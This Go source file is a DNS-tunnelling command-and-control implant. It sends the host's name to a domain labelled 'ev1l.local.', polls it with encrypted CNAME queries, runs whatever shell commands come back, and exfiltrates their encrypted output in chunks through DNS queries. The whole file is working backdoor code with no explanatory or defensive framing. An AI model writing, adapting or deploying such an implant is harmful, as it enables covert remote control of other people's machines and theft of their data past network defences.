package main

import (
	"fmt"
	"github.com/miekg/dns"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

const AesKey = "0123456789abcdef"
const ProxyDomain = "ev1l.local."
const Delay = 3
const DnsServer = "127.0.0.1:53"

func ChunkString(s string, chunkSize int) []string {
	var chunks []string
	runes := []rune(s)

	if len(runes) == 0 {
		return []string{s}
	}

	for i := 0; i < len(runes); i += chunkSize {
		nn := i + chunkSize
		if nn > len(runes) {
			nn = len(runes)
		}
		chunks = append(chunks, string(runes[i:nn]))
	}
	return chunks
}

func hello() string {
	cmd := exec.Command("hostname")
	stdout, err := cmd.Output()
	if err != nil {
		fmt.Println(err.Error())
		stdout = []byte("ERROR: " + err.Error() + "\n")
	}
	str := "initC2_" + strings.TrimSpace(string(stdout))
	encrypted := EncryptMessage([]byte(AesKey), str)
	return encrypted
}

func sendLongOutput(client dns.Client, msg dns.Msg, slice []string) {
	var isReady bool
	parts := len(slice)

	msg.SetQuestion(EncryptMessage([]byte(AesKey), "sendLong_"+strconv.Itoa(parts))+"."+ProxyDomain, dns.TypeCNAME)
	response, _, err := client.Exchange(&msg, DnsServer)
	if err != nil {
		e := err.Error()
		if e == "dns: bad rdata" {
			encrypted := EncryptMessage([]byte(AesKey), "output too long to transmit")
			msg.SetQuestion(encrypted+"."+ProxyDomain, dns.TypeCNAME)
		} else {
			fmt.Printf("Error: %s\n", err)
		}
	}

	if response != nil {
		for _, answer := range response.Answer {
			encryptedAnswer := strings.Split(answer.String(), "\t")[4]
			encryptedAnswer = strings.TrimSuffix(encryptedAnswer, ProxyDomain)
			encryptedAnswer = encryptedAnswer[0 : len(encryptedAnswer)-1]
			fmt.Println("Encrypted: " + encryptedAnswer)

			decryptedAnswer := DecryptMessage([]byte(AesKey), encryptedAnswer)
			fmt.Println("Decrypted: " + decryptedAnswer)

			if strings.EqualFold(decryptedAnswer, "readyRcv") {
				isReady = true
			}
		}
	}

	if !isReady {
		fmt.Println("not ready")
	}

	for i, s := range slice {
		msg.SetQuestion("prt."+strconv.Itoa(i)+"."+strconv.Itoa(parts)+"."+s+"."+ProxyDomain, dns.TypeCNAME)
		response, _, err := client.Exchange(&msg, DnsServer)
		if err != nil {
			e := err.Error()
			if e == "dns: bad rdata" {
				encrypted := EncryptMessage([]byte(AesKey), "output too long to transmit")
				msg.SetQuestion(encrypted+"."+ProxyDomain, dns.TypeCNAME)
			} else {
				fmt.Printf("Error: %s\n", err)
			}
		}
		if response != nil {
			for _, answer := range response.Answer {
				encryptedAnswer := strings.Split(answer.String(), "\t")[4]
				encryptedAnswer = strings.TrimSuffix(encryptedAnswer, ProxyDomain)
				encryptedAnswer = encryptedAnswer[0 : len(encryptedAnswer)-1]
				fmt.Println("Encrypted: " + encryptedAnswer)

				decryptedAnswer := DecryptMessage([]byte(AesKey), encryptedAnswer)
				fmt.Println("Decrypted: " + decryptedAnswer)

				if !strings.EqualFold(decryptedAnswer, "rcvLong"+strconv.Itoa(i)+":"+strconv.Itoa(parts)) {
					fmt.Printf("Error in ACK")
					break
				}
			}
		}
	}

}

func main() {
	client := dns.Client{}
	msg := dns.Msg{}
	data := hello()
	msg.SetQuestion(data+"."+ProxyDomain, dns.TypeCNAME)

	for {
		response, _, err := client.Exchange(&msg, DnsServer)
		if err != nil {
			e := err.Error()
			if e == "dns: bad rdata" {
				encrypted := EncryptMessage([]byte(AesKey), "output too long to transmit")
				msg.SetQuestion(encrypted+"."+ProxyDomain, dns.TypeCNAME)
			} else {
				fmt.Printf("Error: %s\n", err)
				return
			}
		}

		if response != nil {
			for _, answer := range response.Answer {
				encryptedAnswer := strings.Split(answer.String(), "\t")[4]
				encryptedAnswer = strings.TrimSuffix(encryptedAnswer, ProxyDomain)
				encryptedAnswer = encryptedAnswer[0 : len(encryptedAnswer)-1]
				fmt.Println("Encrypted: " + encryptedAnswer)

				decryptedAnswer := DecryptMessage([]byte(AesKey), encryptedAnswer)
				fmt.Println("Decrypted: " + decryptedAnswer)

				if strings.EqualFold(decryptedAnswer, "init") {
					msg.SetQuestion(EncryptMessage([]byte(AesKey), "beacon")+"."+ProxyDomain, dns.TypeCNAME)
					continue
				}

				if strings.EqualFold(decryptedAnswer, "idle") {
					msg.SetQuestion(EncryptMessage([]byte(AesKey), "beacon")+"."+ProxyDomain, dns.TypeCNAME)
					continue
				}

				cmdWithArgs := strings.Split(decryptedAnswer, " ")
				command, args := cmdWithArgs[0], cmdWithArgs[1:]

				cmd := exec.Command(command, args...)
				stdout, err := cmd.Output()
				if err != nil {
					fmt.Println(err.Error())
					stdout = []byte("ERROR: " + err.Error() + "\n")
				}

				encrypted := EncryptMessage([]byte(AesKey), string(stdout))
				fmt.Println(encrypted + "\n")

				var slice []string
				if len(encrypted) > 48 {
					slice = ChunkString(encrypted, 48)
					sendLongOutput(client, msg, slice)
					msg.SetQuestion(EncryptMessage([]byte(AesKey), "beacon")+"."+ProxyDomain, dns.TypeCNAME)
					continue
				}

				msg.SetQuestion(encrypted+"."+ProxyDomain, dns.TypeCNAME)
			}
		}

		t1 := time.NewTimer(Delay * time.Second)
		<-t1.C
	}

}
